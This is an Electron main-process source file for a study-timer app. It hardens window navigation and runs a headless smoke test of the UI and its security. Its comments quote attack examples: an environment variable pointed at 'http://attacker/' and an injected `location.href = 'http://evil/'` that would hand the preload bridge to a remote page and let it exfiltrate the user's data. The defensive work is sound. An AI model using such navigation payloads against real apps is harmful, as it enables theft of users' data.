import { join } from 'node:path';

import type { Repositories } from '@nerdyapp/core';
import { app, BrowserWindow, dialog, ipcMain } from 'electron';

import { registerIpc } from './ipc.js';
import { SessionController } from './session-controller.js';

/**
 * Where the built `out/` directory is, supplied BY THE ENTRY FILE.
 *
 * Two wrong answers were tried first, both worth recording:
 *  * `import.meta.url` inside this module points at `out/main/chunks/…`,
 *    because rollup hoists shared code into a chunk — so `../renderer` resolved
 *    to `out/main/renderer` and the window silently loaded nothing.
 *  * `app.getAppPath()` returns the directory of the script Electron was given,
 *    which is `out/main` when launched as `electron out/main/index.js` — and
 *    the two builds cannot both be launched via the package.json `main` field.
 *
 * The entry files are rollup *inputs*, so they are never chunked and their own
 * `import.meta.url` is always `out/main/<entry>.js`. That is the one stable
 * anchor, so they pass it in.
 */
let outRoot = '';

/**
 * What the two executables differ by. `nerdyapp.exe` passes the SQLite
 * bindings; `nerdyapp-test.exe` passes in-memory fixtures and opens no
 * database at all (V3 spec §5).
 */
export interface AppBindings {
  /** Shown in the title bar so the two builds are never confused at a glance. */
  readonly label: string;
  /** True only for the product build. The test build must never touch a file. */
  readonly usesDatabase: boolean;
  /** Absolute path of the built `out/` directory. See the note on `outRoot`. */
  readonly outRoot: string;
  /**
   * Built AFTER `app.whenReady()`, because the product binding needs
   * `app.getPath('appData')` and runs crash recovery — both of which must
   * happen before a window can exist, and neither of which is available at
   * module load.
   */
  readonly open: () => {
    repositories: Repositories;
    close: () => void;
    /** Present only on the product binding — the test build has nothing to back up. */
    backupTo?: (targetPath: string) => void;
  };
}

const isSmoke = process.argv.includes('--smoke');

// CI runners have no usable GPU, and the resulting "GPU state invalid" churn is
// noise at best and a hang at worst. Must be called before `whenReady`.
if (isSmoke) app.disableHardwareAcceleration();

function createWindow(bindings: AppBindings): BrowserWindow {
  const win = new BrowserWindow({
    width: 1280,
    height: 860,
    show: !isSmoke,
    title: bindings.label,
    webPreferences: {
      preload: join(outRoot, 'preload', 'index.cjs'),
      // The renderer must never reach SQLite or the filesystem. `core` runs in
      // this process; everything the window can do crosses an explicitly
      // allowlisted preload surface (plan P31B, decision B2).
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: true,
    },
  });

  // Gated on isPackaged: without it, `set ELECTRON_RENDERER_URL=http://attacker/`
  // makes an attacker's page BE the app window, holding the preload bridge and
  // with no CSP. The dev server is a development affordance and has no business
  // in a shipped binary.
  const devUrl = app.isPackaged ? undefined : process.env['ELECTRON_RENDERER_URL'];
  if (devUrl !== undefined) {
    void win.loadURL(devUrl);
  } else {
    void win.loadFile(join(outRoot, 'renderer', 'index.html'));
  }
  return win;
}

/**
 * THE RENDERER MAY NEVER LEAVE ITS OWN DOCUMENT.
 *
 * Without this, one line of injected script — `location.href = 'http://evil/'` —
 * navigates the window to an attacker-controlled origin that still holds the
 * full preload bridge, and the meta CSP does NOT follow: it died with the local
 * document. An independent review demonstrated exactly this inside the real
 * built app, reading the entire study history from a remote page and
 * exfiltrating it.
 *
 * The precondition is script execution in the renderer, which is not exotic for
 * an app whose roadmap adds seven views plus an in-app notepad and editor
 * (masterplan §7, Phase 7), and which bundles third-party dependencies.
 *
 * Note `window.open` was verified NOT to inherit the bridge in this
 * configuration — the child gets `undefined`. `will-navigate` is the real
 * vector, and denying window opens is defence in depth rather than the fix.
 */
function hardenNavigation(): void {
  app.on('web-contents-created', (_event, contents) => {
    contents.on('will-navigate', (event, url) => {
      const current = contents.getURL();
      // Same-document navigation only. Anything else — including the dev server
      // reloading itself — must be an explicit load from this process.
      if (url !== current) {
        event.preventDefault();
        console.warn(`[nerdyapp] blocked navigation to ${url}`);
      }
    });
    contents.setWindowOpenHandler(({ url }) => {
      console.warn(`[nerdyapp] blocked window.open to ${url}`);
      return { action: 'deny' };
    });
    contents.on('will-attach-webview', (event) => {
      event.preventDefault();
    });
  });
}

/**
 * Drives a REAL session through the real UI, headlessly.
 *
 * "The window mounted" was all the previous smoke claimed, and it would have
 * stayed green with every button broken. This clicks: create a subject → start
 * → pause → resume → distraction → end → read history. It goes through the
 * preload allowlist, IPC, the controller and the bound repositories, so it is
 * the first check that exercises the whole stack in the direction a user does.
 *
 * It still cannot see. Whether the window LOOKS right stays on Isaac's manual
 * list, and so does the real crash-recovery kill test — no scripted flow
 * substitutes for pulling the power on a running process.
 */
async function runSmokeFlow(win: BrowserWindow): Promise<boolean> {
  const js = (expr: string): Promise<unknown> => win.webContents.executeJavaScript(expr);
  const settle = async (): Promise<void> => {
    await new Promise((r) => setTimeout(r, 250));
  };
  const text = async (): Promise<string> => (await js('document.body.innerText')) as string;
  const click = async (testId: string): Promise<void> => {
    await js(`document.querySelector('[data-testid="${testId}"]').click()`);
    await settle();
  };

  const failures: string[] = [];
  const check = (name: string, ok: boolean, saw: string): void => {
    if (!ok) failures.push(`${name} — saw: ${saw.replace(/\s+/g, ' ').slice(0, 160)}`);
    console.log(`  ${ok ? 'PASS' : 'FAIL'}  ${name}`);
  };

  console.log('=== SMOKE FLOW ===');
  const name = `Smoke ${String(Date.now())}`;

  await js(
    `(() => { const i = document.querySelector('[data-testid="subject-name"]');
      i.value = ${JSON.stringify(name)};
      i.dispatchEvent(new Event('input', { bubbles: true })); })()`,
  );
  await click('create-subject');
  check('a subject can be created', (await text()).includes(name), await text());

  await click(`start-${name}`);
  check('a session starts', (await text()).includes('00:00:0'), await text());

  const elapsedNow = async (): Promise<string> =>
    (await js('document.querySelector(\'[data-testid="elapsed"]\').innerText')) as string;
  const wait = async (ms: number): Promise<void> => {
    await new Promise((r) => setTimeout(r, ms));
  };

  // The clock must actually ADVANCE. Without this the whole flow passes with
  // `elapsed` hard-coded to zero — probed, and it did — because a sub-second
  // smoke displays 00:00:00 either way.
  await wait(1300);
  check('the elapsed time advances', /00:00:0[1-9]/.test(await elapsedNow()), await elapsedNow());

  await click('toggle-pause');
  check('the session pauses', (await text()).includes('(paused)'), await text());

  // ...and must FREEZE while paused. This is the assertion a tick counter
  // cannot satisfy, which is the regression architecture.md §3.4 forbids.
  const frozenAt = await elapsedNow();
  await wait(1300);
  check('the elapsed time freezes while paused', (await elapsedNow()) === frozenAt, await elapsedNow());

  await click('toggle-pause');
  check('the session resumes', !(await text()).includes('(paused)'), await text());

  await click('self-report');
  check('a distraction is recorded without error', !(await text()).includes('Error'), await text());

  await click('end');
  const after = await text();
  check('the session appears in history', after.includes(name), after);
  check('no session is running afterwards', after.includes('No session running.'), after);

  // The interruption count, read back through the Details expansion. Asserting
  // only "no Error appeared" left the Distracted button free to record nothing:
  // replacing the handler with `() => Promise.resolve()` kept every unit test,
  // both smokes, typecheck and lint green. This is the Phase 2 R3 signal, so it
  // needs a check that can see it.
  await js(
    `document.querySelectorAll('[data-testid="history-row"] button')[0].click()`,
  );
  await settle();
  const detail = await text();
  check(
    'the pause and the distraction were both recorded',
    detail.includes('2 interruption(s)'),
    detail,
  );

  // THE SECURITY CHECK. Without a will-navigate handler, one line of injected
  // script carries the preload bridge to an attacker-controlled origin, where
  // the meta CSP no longer applies — an independent review demonstrated exactly
  // that inside this app, reading the whole study history from a remote page.
  const before = (await js('location.href')) as string;
  await js(`try { location.href = 'http://127.0.0.1:9/'; } catch (e) {}`);
  await wait(400);
  check(
    'the renderer cannot navigate away from its own document',
    ((await js('location.href')) as string) === before,
    (await js('location.href')) as string,
  );

  console.log('=== RENDERER DOM ===');
  console.log((await text()).trim());
  for (const f of failures) console.log(`  ! ${f}`);
  return failures.length === 0;
}

export function start(bindings: AppBindings): void {
  outRoot = bindings.outRoot;

  // A SECOND instance must never open the same database.
  //
  // createSqliteBinding runs recoverCrashedSessions() at open, and recovery
  // cannot distinguish a live session from a crashed one — "unterminated" is
  // the only signal schema v1 carries. So launching the app again mid-session
  // closes the session the user is sitting in front of, as `crashed`, at its
  // last pause watermark. A crashed session can never be surveyed, so a real
  // 90-minute study block becomes unratable and cannot weight the day — and
  // the first window keeps ticking, giving no sign anything went wrong.
  //
  // Only the database-backed build needs this. The test build opens no file,
  // and the smoke runs against a throwaway directory.
  if (bindings.usesDatabase && !isSmoke && !app.requestSingleInstanceLock()) {
    app.quit();
    return;
  }
  hardenNavigation();

  app.on('second-instance', () => {
    const [win] = BrowserWindow.getAllWindows();
    if (win === undefined) return;
    if (win.isMinimized()) win.restore();
    win.focus();
  });
  void app.whenReady().then(async () => {
    // Opened BEFORE the window. For the product this is where the database is
    // created and crash recovery runs; a window that could start a session
    // before recovery finished would have its own session closed as crashed.
    const opened = bindings.open();
    app.on('will-quit', () => {
      opened.close();
    });

    // Registered BEFORE the window exists, so the renderer cannot invoke a
    // channel that has no handler yet.
    registerIpc({
      on: (channel, handler) => {
        ipcMain.handle(channel, (_event, ...args: unknown[]) => handler(...args));
      },
      repositories: opened.repositories,
      controller: new SessionController(opened.repositories),
      backup:
        opened.backupTo === undefined
          ? null
          : async () => {
              const backupTo = opened.backupTo;
              if (backupTo === undefined) return null;
              const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
              const { canceled, filePath } = await dialog.showSaveDialog({
                title: 'Back up the NerdyApp database',
                defaultPath: `nerdyapp-backup-${stamp}.db`,
                filters: [{ name: 'SQLite database', extensions: ['db'] }],
              });
              if (canceled || filePath === undefined) return null;
              backupTo(filePath);
              return filePath;
            },
    });

    const win = createWindow(bindings);

    if (isSmoke) {
      // Surface everything that can silently swallow a renderer: a thrown
      // component, a failed preload, a CSP refusal. Without these the smoke
      // check reports "did not mount" and nothing about why.
      win.webContents.on('console-message', (e) => {
        console.log(`  [renderer:${e.level}] ${e.message} (${e.sourceId}:${String(e.lineNumber)})`);
      });
      win.webContents.on('preload-error', (_e, preloadPath, error) => {
        console.log(`  [preload-error] ${preloadPath}: ${error.message}`);
      });
      win.webContents.on('did-fail-load', (_e, code, desc, url) => {
        console.log(`  [did-fail-load] ${String(code)} ${desc} ${url}`);
      });
    }

    if (isSmoke) {
      // Headless verification that the renderer actually rendered. Reading the
      // DOM back is the only claim this can honestly make without a human at
      // the keyboard — it proves the window loaded and Vue mounted, and nothing
      // about how it looks. The visual check stays on Isaac's manual list.
      await new Promise<void>((resolve) => win.webContents.once('did-finish-load', () => { resolve(); }));
      const ok = await runSmokeFlow(win);
      if (!ok) {
        const html = (await win.webContents.executeJavaScript(
          'document.documentElement.outerHTML',
        )) as string;
        console.log('=== OUTER HTML ===');
        console.log(html.slice(0, 2000));
      }
      console.log(ok ? '=== SMOKE PASS ===' : '=== SMOKE FAIL ===');
      app.exit(ok ? 0 : 1);
      return;
    }

    app.on('activate', () => {
      if (BrowserWindow.getAllWindows().length === 0) createWindow(bindings);
    });
  });

  app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') app.quit();
  });
}
